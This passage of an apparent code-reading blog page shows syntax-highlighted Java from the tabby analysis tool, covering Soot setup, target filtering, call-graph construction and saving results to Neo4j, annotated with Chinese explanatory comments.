function">runSootAnalysis</span><span class="token punctuation">(</span>targets<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>cps<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dataContainer<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dataContainer<span class="token punctuation">.</span><span class="token function">save2CSV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>loadEnabled<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">G</span><span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>future <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>future<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token comment">// do nothing 等待结束</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 这个方法执行Soot分析。它首先初始化Soot选项，加载基本类和动态、</span>    <span class="token comment">// 类，设置Soot类路径，然后运行类信息扫描和函数调用图扫描，最后保存规则状态</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">runSootAnalysis</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> targets<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> classpaths<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">SootConfiguration</span><span class="token punctuation">.</span><span class="token function">initSootOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">addBasicClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Load basic classes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Scene</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadBasicClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Load dynamic classes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Scene</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadDynamicClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Scene</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSootClassPath</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>pathSeparator<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>classpaths<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// get target filepath</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> realTargets <span class="token operator">=</span> <span class="token function">getTargets</span><span class="token punctuation">(</span>targets<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>realTargets<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Nothing to analysis!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">Main</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">autoSetOptions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Target &#123;&#125;, Dependencies &#123;&#125;"</span><span class="token punctuation">,</span> realTargets<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> classpaths<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 类信息抽取</span>            classInfoScanner<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>realTargets<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 全量函数调用图构建</span>            callGraphScanner<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            rulesContainer<span class="token punctuation">.</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">long</span> time <span class="token operator">=</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">NANOSECONDS</span><span class="token punctuation">.</span><span class="token function">toSeconds</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Total cost &#123;&#125; min &#123;&#125; seconds."</span>                    <span class="token punctuation">,</span> time<span class="token operator">/</span><span class="token number">60</span><span class="token punctuation">,</span> time<span class="token operator">%</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//            if (!Options.v().oaat()) &#123;</span><span class="token comment">//                PackManager.v().writeOutput();</span><span class="token comment">//            &#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CompilationDeathException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token class-name">CompilationDeathException</span><span class="token punctuation">.</span><span class="token constant">COMPILATION_SUCCEEDED</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> e<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 从目标文件中获取真正的目标。它会忽略那些被rulesContainer忽略的文件。</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getTargets</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> targets<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> stuff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> newIgnore <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targets<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> filepath<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rulesContainer<span class="token punctuation">.</span><span class="token function">isIgnore</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                stuff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">;</span>                newIgnore<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        rulesContainer<span class="token punctuation">.</span><span class="token function">getIgnored</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>newIgnore<span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Total analyse &#123;&#125; targets."</span><span class="token punctuation">,</span> stuff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_process_dir</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>stuff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>stuff<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addBasicClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> basicClasses <span class="token operator">=</span> rulesContainer<span class="token punctuation">.</span><span class="token function">getBasicClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> cls<span class="token operator">:</span>basicClasses<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Scene</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addBasicClass</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token constant">HIERARCHY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 保存数据到Neo4j数据库</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Start to save cache."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save2Neo4j</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> time <span class="token operator">=</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">NANOSECONDS</span><span class="token punctuation">.</span><span class="token function">toSeconds</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Cost &#123;&#125; min &#123;&#125; seconds."</span>                <span class="token punctuation">,</span> time<span class="token operator">/</span><span class="token number">60</span><span class="token punctuation">,</span> time<span class="token operator">%</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycorescannercallgraphscanner.java">tabby/core/scanner/CallGraphScanner.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>scanner</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collector<span class="token punctuation">.</span></span><span class="token class-name">CallEdgeCollector</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collector<span class="token punctuation">.</span></span><span class="token class-name">CallGraphCollector</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container<span class="token punctuation">.</span></span><span class="token class-name">DataContainer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>ref<span class="token punctuation">.</span></span><span class="token class-name">MethodReference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>dal<span class="token punctuation">.</span>caching<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">MethodRefService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">TickTock</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collection</span></span><span class="token punctuation">;</span><span class="token comment">/** * 收集所有调用关系，这部分不做污点分析 * @author wh1t3P1g * @since 2020/11/17 */</span><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CallGraphScanner</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">public</span> <span class="token class-name">MethodRefService</span> methodRefService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">public</span> <span class="token class-name">DataContainer</span> dataContainer<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">public</span> <span class="token class-name">CallGraphCollector</span> callGraphCollector<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CallEdgeCollector</span> callEdgeCollector<span class="token punctuation">;</span>    <span class="token comment">// 先收集调用图信息，然后保存这些信息</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 会收集所有的方法引用，并根据全局配置决定是收集完整的调用图还是只收集调用图的边。</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MethodReference</span><span class="token punctuation">></span></span> targets <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>dataContainer<span class="token punctuation">.</span><span class="token function">getSavedMethodRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Build call graph. START!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TickTock</span> tickTock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TickTock</span><span class="token punctuation">(</span>targets<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">MethodReference</span> target <span class="token operator">:</span> targets<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_FULL_CALL_GRAPH_CONSTRUCT</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                callEdgeCollector<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> dataContainer<span class="token punctuation">,</span> tickTock<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                callGraphCollector<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> dataContainer<span class="token punctuation">,</span> tickTock<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        tickTock<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Build call graph. DONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 收集到的数据保存到图数据库中。</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Save remained data to graphdb. START!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">"class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">"method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">"has"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">"call"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">"alias"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">"extend"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">"interfaces"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Save remained data to graphdb. DONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="tabbycoredatacontext.java">tabby/core/data/Context.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">ch<span class="token punctuation">.</span>qos<span class="token punctuation">.</span>logback<span class="token punctuation">.</span>classic<span class="token punctuation">.</span></span><span class="token class-name">Level</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">ch<span class="token punctuation">.</span>qos<span class="token punctuation">.</span>logback<span class="token punctuation">.</span>classic<span class="token punctuation">.</span></span><span class="token class-name">LoggerContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">CommandLineRunner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">EntityScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>repository<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">EnableNeo4jRepositories</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">Analyser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span></span><span class="token punctuation">;</span><span class="token comment">// @Slf4j：@Slf4j注解会在编译时通过Lombok生成代码,</span><span class="token comment">// 为该类添加一个静态的log字段,类型为org.slf4j.Logger。</span><span class="token comment">// 这样就可以直接在类中使用this.log来打印日志,而不需要手动创建Logger实例。</span><span class="token comment">// @SpringBootApplication：Spring Boot注解，标记这个类为Spring Boot应用程序的主类。</span><span class="token comment">// @EntityScan：Spring Boot注解，指定Spring应该扫描哪些包来查找JPA实体。</span><span class="token comment">// @EnableNeo4jRepositories：启用 Neo4j 存储库。</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@EntityScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"tabby.dal.caching.bean"</span><span class="token punctuation">,</span><span class="token string">"tabby.dal.neo4j.entity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableNeo4jRepositories</span><span class="token punctuation">(</span><span class="token string">"tabby.dal.neo4j.repository"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// @Autowired 注解用于将 Analyser 实例注入到 App 类中。这意味著 Spring Boot 会自动创建一个 Analyser 实例，并将其注入到 App 类中。</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">Analyser</span> analyser<span class="token punctuation">;</span>    <span class="token comment">// 启动 Spring Boot 应用程序，并根据命令行参数设置配置文件路径</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"--config"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">CONFIG_FILE_PATH</span> <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token 